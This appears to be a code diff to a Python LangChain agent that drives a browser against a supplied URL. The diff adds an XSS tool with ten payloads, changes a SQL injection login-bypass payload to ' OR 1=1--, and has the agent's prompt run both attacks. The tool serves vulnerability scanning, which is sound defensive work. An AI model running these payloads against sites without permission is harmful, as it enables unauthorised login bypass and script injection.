@@ -266,7 +266,7 @@ class SqlInjectionTestInput(BaseModel):
 class SqlInjectionTestTool(BaseTool):
     """Tool for systematic SQL injection testing"""
     name: str = "sql_injection_test"
-    description: str = """Use this to test SQL injection with admin username and ' OR 1=1 password.
+    description: str = """Use this to test SQL injection with admin username and ' OR 1=1-- password.
     Input should be: username_selector,password_selector (e.g., "#username,#password")"""
     args_schema: Type[BaseModel] = SqlInjectionTestInput
     
@@ -274,7 +274,7 @@ class SqlInjectionTestTool(BaseTool):
         return "Error: Use async version"
     
     async def _arun(self, query: str) -> str:
-        """Execute SQL injection testing with admin/' OR 1=1"""
+        """Execute SQL injection testing with admin/' OR 1=1--"""
         print(f"Starting SQL injection test with query: {query}")
         try:
             if not query or ',' not in query:
@@ -289,7 +289,7 @@ class SqlInjectionTestTool(BaseTool):
             
             # Single SQL injection payload to test
             username = "admin"
-            password_payload = "' OR 1=1"
+            password_payload = "' OR 1=1--"
             
             print(f"Testing with username: {username} and password: {password_payload}")
             
@@ -362,12 +362,137 @@ class SqlInjectionTestTool(BaseTool):
             return f"Error in SQL injection testing: {str(e)}\n{traceback.format_exc()}"
 
 
+# Add XSS testing tool after SqlInjectionTestTool
+class XssTestInput(BaseModel):
+    """Input for XssTestTool"""
+    query: str = Field(description="Target selector for input field (e.g., '#search-input' or 'input[name=\"search\"]')")
+
+
+class XssTestTool(BaseTool):
+    """Tool for systematic XSS vulnerability testing"""
+    name: str = "xss_test"
+    description: str = """Use this to test for XSS vulnerabilities in input fields.
+    Input should be: target_selector (e.g., "#search-input")"""
+    args_schema: Type[BaseModel] = XssTestInput
+    
+    def _run(self, query: str) -> str:
+        return "Error: Use async version"
+    
+    async def _arun(self, query: str) -> str:
+        """Execute XSS testing with various payloads"""
+        print(f"Starting XSS test with query: {query}")
+        try:
+            if not query or query.lower() in ['none', 'null', '']:
+                return "Error: Target selector required"
+            
+            selector = query.strip()
+            
+            if not current_session:
+                return "Error: Session not initialized"
+            
+            # XSS payloads to test
+            xss_payloads = [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert('XSS')>",
+                "javascript:alert('XSS')",
+                "<iframe src=javascript:alert('XSS')>",
+                "'><script>alert('XSS')</script>",
+                "\"><script>alert('XSS')</script>",
+                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+                "<SCRIPT>alert('XSS')</SCRIPT>",
+                "%3Cscript%3Ealert('XSS')%3C/script%3E"
+            ]
+            
+            vulnerabilities_found = []
+            
+            for i, payload in enumerate(xss_payloads):
+                print(f"Testing XSS payload {i+1}/{len(xss_payloads)}: {payload[:50]}...")
+                
+                try:
+                    # Store original URL and content
+                    original_url = current_session.page.url
+                    
+                    # Clear and fill input with XSS payload
+                    await current_session.page.fill(selector, "")
+                    await current_session.fill_input(selector, payload)
+                    await asyncio.sleep(0.5)
+                    
+                    # Try to trigger the input (submit, enter, or trigger search)
+                    try:
+                        # First try pressing Enter
+                        await current_session.page.press(selector, "Enter")
+                        await asyncio.sleep(1)
+                    except:
+                        try:
+                            # Try clicking a submit button nearby
+                            await current_session.click("button[type='submit']")
+                            await asyncio.sleep(1)
+                        except:
+                            try:
+                                # Try clicking any button near the input
+                                await current_session.click("button")
+                                await asyncio.sleep(1)
+                            except:
+                                # Just wait for any auto-processing
+                                await asyncio.sleep(1)
+                    
+                    # Check for XSS execution indicators
+                    page_content = await current_session.get_content(format=ContentFormat.HTML)
+                    page_text = await current_session.get_content(format=ContentFormat.TEXT)
+                    
+                    # Check if payload is reflected in the page
+                    payload_reflected = payload.lower() in page_content.lower()
+                    
+                    # Check for potential script execution
+                    has_script_tags = "<script>" in page_content.lower() and "alert" in page_content.lower()
+                    
+                    # Check for unencoded special characters
+                    dangerous_chars = ["<", ">", "\"", "'"]
+                    unencoded_chars = [char for char in dangerous_chars if payload.count(char) > 0 and page_content.count(char) >= payload.count(char)]
+                    
+                    # Evaluate potential vulnerability
+                    if payload_reflected and (has_script_tags or len(unencoded_chars) > 0):
+                        severity = "HIGH" if has_script_tags else "MEDIUM"
+                        vulnerabilities_found.append({
+                            "payload": payload,
+                            "severity": severity,
+                            "reflected": payload_reflected,
+                            "unencoded_chars": unencoded_chars,
+                            "has_script_tags": has_script_tags
+                        })
+                        print(f"🚨 Potential XSS vulnerability found with payload: {payload}")
+                    
+                except Exception as e:
+                    print(f"Error testing payload '{payload}': {str(e)}")
+                    continue
+            
+            # Compile results
+            if vulnerabilities_found:
+                result = f"🚨 XSS VULNERABILITIES DETECTED! Found {len(vulnerabilities_found)} potential issues:\n\n"
+                for vuln in vulnerabilities_found:
+                    result += f"- Payload: {vuln['payload']}\n"
+                    result += f"  Severity: {vuln['severity']}\n"
+                    result += f"  Payload reflected: {vuln['reflected']}\n"
+                    if vuln['unencoded_chars']:
+                        result += f"  Unencoded characters: {', '.join(vuln['unencoded_chars'])}\n"
+                    result += "\n"
+                
+                result += "RECOMMENDATION: Input validation and output encoding should be implemented to prevent XSS attacks."
+                return result
+            else:
+                return f"XSS testing completed on selector '{selector}'. No obvious vulnerabilities detected. Tested {len(xss_payloads)} payloads."
+                
+        except Exception as e:
+            return f"Error in XSS testing: {str(e)}\n{traceback.format_exc()}"
+
+
 def create_vulnerability_agent() -> AgentExecutor:
     """Create a LangChain agent with Playwright tools for vulnerability testing"""
     
     # Initialize OpenAI LLM
     llm = ChatOpenAI(
-        model="gpt-4o-mini",
+        model="gpt-4.1-mini",
         temperature=0,
         openai_api_key=os.getenv("OPENAI_API_KEY")
     )
@@ -377,7 +502,8 @@ def create_vulnerability_agent() -> AgentExecutor:
         InputTextBoxTool(),
         ClickButtonTool(),
         ScrapePageTool(),
-        SqlInjectionTestTool()
+        SqlInjectionTestTool(),
+        XssTestTool()  # NEW XSS testing tool
     ]
     
     # Use a custom prompt that handles tool inputs better
@@ -402,6 +528,7 @@ IMPORTANT:
 - For input_textbox tool, use format "selector,text" as Action Input (no quotes around the entire string)
 - For click_button tool, use the CSS selector as Action Input
 - For sql_injection_test tool, use format "username_selector,password_selector" as Action Input
+- For xss_test tool, use the CSS selector of the input field as Action Input
 - Never use None, null, or empty values as Action Input
 
 Begin!
@@ -452,27 +579,29 @@ async def run_vulnerability_test(target_url: str) -> Dict[str, Any]:
             
             # Initial prompt for the agent
             initial_prompt = f"""
-            You are a web security expert testing the login page at {target_url} for SQL injection vulnerabilities.
+            You are a web security expert testing the login page at {target_url} for vulnerabilities.
             
-            You have access to four tools:
+            You have access to five tools:
             1. scrape_page: Get current page content and detect forms/inputs (Action Input: "scrape")
             2. input_textbox: Enter text into input fields (Action Input: "selector,text")
             3. click_button: Click buttons or submit forms (Action Input: "selector")
             4. sql_injection_test: Systematically test multiple SQL injection payloads (Action Input: "username_selector,password_selector")
+            5. xss_test: Systematically test for XSS vulnerabilities in input fields (Action Input: "selector")
             
             IMPORTANT: Always provide proper Action Input strings - never use None, null, or empty values.
             
             Please follow these steps systematically:
             1. Use scrape_page with Action Input "scrape" to understand the page structure
-            2. Identify login form fields (username/password inputs) and their selectors
-            3. Use sql_injection_test with Action Input "username_selector,password_selector" to test multiple payloads systematically
-            4. If sql_injection_test doesn't work, try manual testing:
+            2. Identify form fields (username/password inputs and other input fields) and their selectors
+            3. Use xss_test with Action Input "selector" to test for XSS vulnerabilities in ALL input fields first
+            4. Use sql_injection_test with Action Input "username_selector,password_selector" to test SQL injection on login form
+            5. If sql_injection_test doesn't work, try manual testing:
                - Using input_textbox with Action Input "selector,admin" to enter username
                - Using input_textbox with Action Input "selector,' OR 1=1--" to enter malicious password
                - Using click_button to submit the form
-            5. Use scrape_page with Action Input "scrape" again to check if login was successful
-            6. Look for signs of successful login (welcome messages, dashboard, different URL, etc.)
-            7. Report whether SQL injection vulnerability was detected
+            6. Use scrape_page with Action Input "scrape" again to check if login was successful
+            7. Look for signs of successful login (welcome messages, dashboard, different URL, etc.)
+            8. Report whether XSS or SQL injection vulnerabilities were detected
             
             Begin your assessment now.
             """
